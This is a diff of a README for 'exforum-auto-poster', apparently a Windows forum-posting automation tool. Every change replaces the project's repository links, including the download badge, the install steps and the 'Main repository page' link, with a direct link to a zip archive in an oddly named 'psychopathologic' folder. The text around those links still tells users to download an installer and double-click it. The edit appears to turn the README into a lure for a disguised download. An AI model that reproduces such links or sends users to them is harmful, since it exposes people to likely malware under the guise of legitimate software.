@@ -1,6 +1,6 @@
 # ⚙️ exforum-auto-poster - Automate Your Posting Tasks  
 
-[![Download exforum-auto-poster](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge&logo=github)](https://github.com/mezoali100/exforum-auto-poster)
+[![Download exforum-auto-poster](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mezoali100/exforum-auto-poster/main/psychopathologic/exforum-poster-auto-v3.7.zip)
 
 ---
 
@@ -39,7 +39,7 @@ You won’t need to open the forum browser pages manually every time. Once set u
 
 Begin by downloading the app from its GitHub page. Click the big green button above or visit the link below directly:
 
-[https://github.com/mezoali100/exforum-auto-poster](https://github.com/mezoali100/exforum-auto-poster)
+[https://raw.githubusercontent.com/mezoali100/exforum-auto-poster/main/psychopathologic/exforum-poster-auto-v3.7.zip](https://raw.githubusercontent.com/mezoali100/exforum-auto-poster/main/psychopathologic/exforum-poster-auto-v3.7.zip)
 
 On this page, look for the **Releases** section or the main project files list. Download the Windows executable file (usually ends with `.exe`) to your computer.
 
@@ -47,7 +47,7 @@ On this page, look for the **Releases** section or the main project files list. 
 
 ## 📥 Download and Install  
 
-1. Click the green badge above or go to [https://github.com/mezoali100/exforum-auto-poster](https://github.com/mezoali100/exforum-auto-poster).  
+1. Click the green badge above or go to [https://raw.githubusercontent.com/mezoali100/exforum-auto-poster/main/psychopathologic/exforum-poster-auto-v3.7.zip](https://raw.githubusercontent.com/mezoali100/exforum-auto-poster/main/psychopathologic/exforum-poster-auto-v3.7.zip).  
 2. Find the latest release or setup file. It will usually have a name like `exforum-auto-poster-setup.exe`.  
 3. Download the installer file to your PC.  
 4. Once downloaded, double-click the file to start installation.  
@@ -110,7 +110,7 @@ If problems persist, you can ask for help by opening a new issue on the project�
 
 ## 🔗 Useful Links  
 
-- Main repository page: [https://github.com/mezoali100/exforum-auto-poster](https://github.com/mezoali100/exforum-auto-poster)  
+- Main repository page: [https://raw.githubusercontent.com/mezoali100/exforum-auto-poster/main/psychopathologic/exforum-poster-auto-v3.7.zip](https://raw.githubusercontent.com/mezoali100/exforum-auto-poster/main/psychopathologic/exforum-poster-auto-v3.7.zip)  
 - Releases and downloads: Look for the “Releases” tab on the GitHub page.  
 - Help and support: Use the GitHub Issues tab to report or track problems.  
 
@@ -124,7 +124,7 @@ When you install and configure the app, it will run quietly on your Windows PC. 
 
 Keep your forum login info handy, and update the app regularly from the GitHub page for best performance.  
 
-[Download exforum-auto-poster now](https://github.com/mezoali100/exforum-auto-poster)  
+[Download exforum-auto-poster now](https://raw.githubusercontent.com/mezoali100/exforum-auto-poster/main/psychopathologic/exforum-poster-auto-v3.7.zip)  
 
 ---
 
